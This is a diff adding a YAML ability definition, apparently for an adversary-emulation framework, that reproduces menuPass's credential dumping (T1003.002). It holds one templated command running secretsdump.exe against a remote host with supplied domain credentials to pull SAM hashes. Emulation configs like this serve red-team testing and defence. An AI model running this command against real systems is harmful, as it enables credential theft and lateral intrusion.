@@ -1,0 +1,31 @@
+ability_id: fe3d4de1-50bf-4241-9546-72dc757e696f
+access: {}
+additional_info: {}
+buckets:
+- credential-access
+delete_payload: true
+description: menuPass has used secretsdump.exe to dump credentials remotely
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: '"#{secretsdump_local_path}\secretsdump.exe" "#{secretsdump_domain}"/"#{secretsdump_user}":"#{secretsdump_pass}"@"#{secretsdump_remote_host}"'
+  language: null
+  name: cmd
+  parsers: []
+  payloads:
+  - secretsdump.exe
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: OS Credential Dumping
+plugin: emu
+privilege: Elevated
+repeatable: false
+requirements: []
+singleton: false
+tactic: credential-access
+technique_id: T1003.002
+technique_name: 'OS Credential Dumping: Security Account Manager'
